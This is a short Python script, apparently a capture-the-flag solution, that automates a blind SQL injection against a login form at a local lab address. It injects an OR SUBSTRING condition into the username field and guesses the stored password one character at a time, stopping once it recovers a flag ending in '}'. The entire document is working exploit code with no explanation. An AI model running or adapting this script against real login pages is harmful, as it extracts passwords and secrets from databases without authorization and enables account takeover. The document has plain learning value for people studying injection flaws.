#!/bin/python

import string
import requests

chars = [x for x in string.printable if x not in ['%', '_']]
url = 'http://172.17.0.2/login.php'
injection = "' OR SUBSTRING(password,1,{})='{}' -- -"
flag = ''

while True:
    for char in chars:
        length = len(flag) + 1
        newString = flag + char
        inject = injection.format(length, newString)
        payload = { 'username': inject, 'password': 'bebas' }

        r = requests.post(url, data=payload)
        
        if 'authorized' in r.text:
            flag = newString
            print(flag)
            break

    if '}' in flag:
        break
